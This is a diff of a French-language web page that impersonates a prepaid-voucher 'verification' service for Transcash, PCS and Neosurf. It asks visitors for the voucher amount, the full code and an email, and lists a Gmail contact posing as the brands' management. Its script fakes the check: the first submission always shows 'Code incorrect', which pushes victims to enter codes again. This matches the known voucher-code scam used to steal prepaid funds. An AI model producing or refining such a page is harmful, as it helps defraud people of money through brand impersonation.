@@ -1,58 +1,195 @@
-echo "<!DOCTYPE html>
-<html lang=\"fr\">
+<!DOCTYPE html>
+<html lang="fr">
 <head>
-    <meta charset=\"UTF-8\">
-    <meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Vérification Recharge</title>
-    <link rel=\"stylesheet\" href=\"styles.css\">
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 0;
+            background-color: #f8f8f8;
+        }
+
+        header {
+            background-color: #333;
+            color: white;
+            padding: 10px;
+            text-align: center;
+        }
+
+        nav {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px;
+            background-color: #444;
+            color: white;
+        }
+
+        nav ul {
+            list-style-type: none;
+            padding: 0;
+            display: flex;
+            margin: 0;
+        }
+
+        nav ul li {
+            margin: 0 10px;
+        }
+
+        nav ul li a {
+            color: white;
+            text-decoration: none;
+        }
+
+        .container {
+            padding: 20px;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+        }
+
+        input[type="text"],
+        input[type="email"],
+        select {
+            width: 100%;
+            padding: 8px;
+            box-sizing: border-box;
+        }
+
+        .radio-group {
+            display: flex;
+            align-items: center;
+        }
+
+        .radio-group input {
+            margin-left: 10px;
+            margin-right: 5px;
+        }
+
+        button {
+            background-color: #28a745;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            cursor: pointer;
+        }
+
+        footer {
+            background-color: #333;
+            color: white;
+            text-align: center;
+            padding: 10px 0;
+            position: fixed;
+            width: 100%;
+            bottom: 0;
+        }
+
+        .navbar-toggle {
+            display: none;
+        }
+
+        @media (max-width: 768px) {
+            nav ul {
+                display: none;
+            }
+
+            .navbar-toggle {
+                display: block;
+                cursor: pointer;
+            }
+        }
+
+        .show {
+            display: block !important;
+        }
+    </style>
 </head>
 <body>
     <header>
-        <nav>
-            <ul>
-                <li><a href=\"index.html\">Accueil</a></li>
-                <li><a href=\"verification.html\">Vérification</a></li>
-                <li><a href=\"#contact\">Contact</a></li>
-            </ul>
-        </nav>
+        <h1>Vérifiez vos recharges</h1>
     </header>
-    <main>
-        <h1>Vérifie ton recharge</h1>
-        <form action=\"#\">
-            <label for=\"nom_recharge\">Nom du recharge*</label>
-            <input type=\"text\" id=\"nom_recharge\" name=\"nom_recharge\" required>
-
-            <label for=\"montant\">Montant*</label>
-            <input type=\"number\" id=\"montant\" name=\"montant\" required>
-
-            <label for=\"code_recharge\">Code du recharge*</label>
-            <input type=\"text\" id=\"code_recharge\" name=\"code_recharge\" required>
-
-            <label for=\"cacher_code\">Cacher votre code:</label>
-            <input type=\"radio\" id=\"oui\" name=\"cacher_code\" value=\"oui\">
-            <label for=\"oui\">Oui</label>
-            <input type=\"radio\" id=\"non\" name=\"cacher_code\" value=\"non\">
-            <label for=\"non\">Non</label>
-
-            <label for=\"email\">Email</label>
-            <input type=\"email\" id=\"email\" name=\"email\">
-
+    <nav>
+        <div class="navbar-toggle">&#9776;</div>
+        <ul id="nav-links">
+            <li><a href="#">Accueil</a></li>
+            <li><a href="#">Vérification</a></li>
+            <li><a href="#">Contact Clientèle</a></li>
+        </ul>
+    </nav>
+    <div class="container">
+        <h2>Vérifie ton recharge</h2>
+        <form id="verification-form">
+            <div class="form-group">
+                <label for="nom-recharge">Nom du recharge*</label>
+                <select id="nom-recharge" required>
+                    <option value="transcash">Transcash</option>
+                    <option value="pcs">PCS</option>
+                    <option value="neosurf">Neosurf</option>
+                </select>
+            </div>
+            <div class="form-group">
+                <label for="montant">Montant*</label>
+                <input type="text" id="montant" required>
+            </div>
+            <div class="form-group">
+                <label for="code-recharge">Code du recharge*</label>
+                <input type="text" id="code-recharge" required>
+            </div>
+            <div class="form-group">
+                <label>Cacher votre code:</label>
+                <div class="radio-group">
+                    <input type="radio" id="cacher-oui" name="cacher-code" value="oui">
+                    <label for="cacher-oui">Oui</label>
+                    <input type="radio" id="cacher-non" name="cacher-code" value="non">
+                    <label for="cacher-non">Non</label>
+                </div>
+            </div>
+            <div class="form-group">
+                <label for="email">Email</label>
+                <input type="email" id="email">
+            </div>
             <p>Notre Politique de confidentialité s'applique.</p>
-
-            <button type=\"submit\">Vérifiez</button>
+            <button type="submit">Vérifiez</button>
         </form>
-    </main>
+        <h2>Horaires D'OUVERTURE</h2>
+        <p>Lu-Ve: 07j/24H</p>
+        <p>Sa-Di: 8h/13H</p>
+        <h2>NOUS TROUVER</h2>
+        <p>123 Rue du test<br>Paris, 75001</p>
+        <p>Email: ladirectiontranscashpcs@gmail.com</p>
+        <h2>NOUS SUIVRE</h2>
+    </div>
     <footer>
-        <p>Horaires D'OUVERTURE</p>
-        <p>Lu-Ve 07j/24H</p>
-        <p>Sa-Di 8h/13H</p>
-
-        <p>NOUS TROUVER</p>
-        <p>123 Rue du test</p>
-        <p>Paris, 75001</p>
-        <p>ladirectiontranscashpcs@gmail.com</p>
-
-        <p>NOUS SUIVRE</p>
+        <p>Mentions légales | Politique de confidentialité | Politique des cookies | Plan du site</p>
+        <p>Ce site a été conçu avec Jimdo. Inscrivez-vous gratuitement sur https://fr.jimdo.com</p>
     </footer>
+    <script>
+        document.querySelector('.navbar-toggle').addEventListener('click', function() {
+            var navLinks = document.getElementById('nav-links');
+            navLinks.classList.toggle('show');
+        });
+
+        document.getElementById('verification-form').addEventListener('submit', function(event) {
+            event.preventDefault();
+            var submitButton = event.target.querySelector('button[type="submit"]');
+            var currentState = submitButton.getAttribute('data-state');
+            if (currentState === 'incorrect' || !currentState) {
+                alert('Code incorrect');
+                submitButton.setAttribute('data-state', 'correct');
+            } else {
+                alert('Code correct');
+                submitButton.removeAttribute('data-state');
+            }
+        });
+    </script>
 </body>
-</html>" > index.html
+</html>
